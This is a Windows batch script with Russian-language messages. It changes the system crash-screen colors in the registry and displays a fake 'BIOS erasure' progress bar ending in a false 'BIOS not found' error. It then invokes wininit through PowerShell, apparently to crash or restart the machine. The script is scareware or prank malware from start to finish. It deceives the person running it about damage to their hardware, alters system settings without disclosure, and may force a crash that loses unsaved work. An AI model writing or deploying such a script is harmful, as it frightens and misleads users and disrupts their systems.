@echo off
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl" /v "MessageBackColor" /t REG_SZ /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl" /v "MessageTextColor" /t REG_SZ /d "F" /f
cls
color 0a
echo Инициализация стирания BIOS...
timeout /t 2 >nul
echo [##########] 10%% - Поиск секторов...
timeout /t 1 >nul
echo [####################] 40%% - Перезапись Flash...
timeout /t 1 >nul
echo [##############################] 90%% - Завершено.
echo ОШИБКА: BIOS НЕ НАЙДЕН. ПЕРЕЗАГРУЗКА...
timeout /t 3 >nul
powershell.exe wininit
